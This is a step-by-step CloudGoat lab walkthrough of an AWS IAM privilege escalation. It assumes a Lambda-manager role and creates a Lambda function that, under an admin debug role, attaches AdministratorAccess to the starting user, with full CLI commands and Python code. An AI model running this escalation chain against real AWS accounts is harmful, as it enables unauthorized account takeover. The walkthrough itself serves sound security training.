### 1. Configuring Credentials
After launching the scenario, you will be provided with an Access Key ID and Secret Access Key. Configure these as a profile with the AWS CLI. 

```bash 
aws configure --profile chris
``` 

### 2. Confirming Credentials
After setting up the profile, it's always a good idea to confirm the credentials. You can do this with the following command: 

```bash
aws sts get-caller-identity --profile chris
```
This should provide you with the UserId, Account #, and ARN for the starting user. 


### 3. Checking Our Permissions 
Now that we have confirmed initial access, we want to see which permissions our user has in the AWS environment. One way we can do this is by seeing if our user has any policies attached or assigned to them. In AWS, a policy is essentially a JSON document that defines what actions (e.g., read, write) are allowed or denied on which resources (e.g., an S3 bucket, an EC2 instance). Policies can be attached to IAM users, groups, and roles to control their permissions and enforce security boundaries.

#### Inline Policies
Let's first check for inline policies. Inline policies are AWS IAM policies that are embedded directly into a single IAM user, group, or role. Unlike managed policies (which are standalone and can be attached to multiple entities), inline policies exist only for the specific entity they are attached to, so they provide a unique set of permissions that are tightly coupled to that one user, group, or role.

```bash
aws iam list-user-policies --user-name chris-<cloudgoat_id> --profile chris
```

#### Managed Policies
We do not have any inline policies. Let's check for managed policies. Managed policies are standalone IAM policies that are not embedded directly into a single entity. They can be created and administered either by AWS (AWS-managed policies) or by customers themselves (customer-managed policies). These policies can be attached to multiple users, groups, or roles, making them easier to maintain and reuse across different entities in your AWS environment.

```bash
aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile chris
```
Great, we found a policy! 

#### Policy Versions 
Policy versions let you keep multiple revisions of the same managed policy. You can store up to five versions of a policy at a time, with only one being the default (active) version. This makes it easier to revert to an older version if you need to undo a change or troubleshoot an issue.

When performing a penetration test or looking for privilege escalation paths, it’s important to inspect all versions of a policy because a non-default (inactive) version might contain broader or more permissive privileges than the currently active one. 

Let's list all the policy versions for this policy: 

```bash
aws iam list-policy-versions --policy-arn [Policy ARN] --profile chris
```

There is only only one version - v1. Let's list the specifics of this policy to see what we have access to. 
```bash
aws iam get-policy-version --policy-arn [Policy ARN] --version-id v1 --profile chris
```
This shows us that our user has access to IAM resources and the ability to assume roles. 

### 4. Hunting for Roles
Since we have the ability to list IAM resources and assume roles, we should see what roles are in the account (and hopefully we can assume one of them!) 

```bash
aws iam list-roles --profile chris
``` 
There is a cg-lambdaManager role able to be assumed by our user. This is due to the "Allow" in place for our user's ARN. 

To assume a role in AWS means to temporarily take on the access permissions associated with that role. It’s a way for an AWS user or service to gain credentials that allow different or expanded permissions, without permanently attaching those permissions to the primary identity.
```json
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::703671921227:user/chris-lambda_privesc_cgidydajq393qx"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
```

There is also a cg-debug role that is able to be assumed by Lambda. If we can assume the Lambda role first, we should be able to then pursue this role. 
```json
{
            "Path": "/",
            "RoleName": "cg-debug-role-lambda_privesc_cgidydajq393qx",
            "RoleId": "AROA2HVQ5NJF4DHIBD2DI",
            "Arn": "arn:aws:iam::703671921227:role/cg-debug-role-lambda_privesc_cgidydajq393qx",
            "CreateDate": "2025-03-13T15:27:21Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
``` 
### 5. Checking Role Permissions 
Our current user has access to IAM Resources, so let's see what permissions these two roles have. 

#### cg-lambdaManager
We can check the permissions for this role with the following two commands. The first command will provide us with the ARN of the policy. The command will list out the actual permissions attached to the policy ARN. 
```bash
# Getting the Policy ARN
aws iam list-attached-role-policies --role-name cg-lambdaManager-role-lambda_privesc_[CloudGoat-ID] --profile chris

# Listing the actual permissions of the policy
aws iam get-policy-version --policy-arn [Policy ARN] --version-id v1 --profile chris
```
This policy grants unrestricted access to all AWS Lambda operations, meaning the entity can create, modify, delete, and invoke Lambda functions. It also allows the entity to pass any IAM role to Lambda, potentially escalating privileges by attaching a role with higher permissions to a Lambda function.

#### cg-debug
Let's run the same commands against the cg-debug role to check permissions. 
```bash
# Getting the Policy ARN
aws iam list-attached-role-policies --role-name cg-debug-role-lambda_privesc_[CloudGoat-ID] --profile chris
```
We don't even have to run the second command since the attached policy is `AdministratorAccess`. If we can compromise this role, we can compromise the full account. 

### 6. Assuming the cg-LambdaManager Role 
When we assume a role, it will generate temporary credentials for us. These credentials will provide us with the same permissions as the role. Let's do that now: 

```bash
aws sts assume-role --role-arn [LambdaManager Role ARN] --role-session-name lambdaManager --profile chris
```
This will provide you with the following:
- Access Key ID
- Secret Access Key
- Session Token

#### Adding Credentials to ~/.aws/credentials 
To use this role, we need to add the information to our ~/.aws/credentials file. You can open this with nano or your favorite text editor, and add it in this format: 
```bash
[lambdaManager]
aws_access_key_id = ASIA.....
aws_secret_access_key = 5sJu.......
aws_session_token = FwoGZ.....
```
Finally, let's confirm we have access to this role: 
```bash
aws sts get-caller-identity --profile lambdaManager
```
As long as everything worked, you should be provided with the UserID, Account, and ARN of this new role. 

### 7. Creating a Lambda Function for Privilege Escalation 
Since we have the ability to create Lambda functions, and the Lambda functions are able to assume AdministratorAccess, we can create a LambdaFunction that assigns administrative access to our user. 

#### Creating the Lambda Function
To create the lambda function, you need to create a file called `lambda_function.py` with the code below. By default, AWS Lambda’s Python runtime expects the handler in a file named lambda_function.py with a handler function called lambda_handler. 
```python
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    # Adjust the username and policy ARN as needed
    iam.attach_user_policy(
        UserName='chris-lambda_privesc_[Cloudgoat ID]',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "Policy attached!"
```
This code defines a Lambda function that uses the AWS SDK for Python (boto3) to attach a specific AWS-managed policy (AdministratorAccess) to the IAM user named chris-lambda_privesc_cgidydajq393qx. In other words, once this function runs, the specified IAM user will have full administrative privileges in the AWS account.

### 8. Creating and Invoking the Function 
Finally, let's create and then invoke the function for privilege escalation! 

#### Creating the Function 
To create the function, we first need to add it to a zip file. 
```bash
zip -r lambda_function.py.zip lambda_function.py
```
Let's actually create the function now with the AWS CLI (p.s. - you don't need to memorize syntax. ChatGPT and Google will come in handy for these kinds of things!) 
```bash
aws lambda create-function --function-name admin_function --runtime python3.9 --role [cg-debug-role arn] --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager --region us-east-1
```
#### Invoking the Function
Finally, let's invoke the function. This should provide our "chris" user with administative privileges 
```bash
aws lambda invoke --function-name admin_function out.txt --profile lambdaManager --region us-east-1
```

### 9. Confirming Privilege Escalation 
Let's check the permissions on our user. If all worked, we should have the AdministratorAccess policy applied! 
```bash
aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris
```
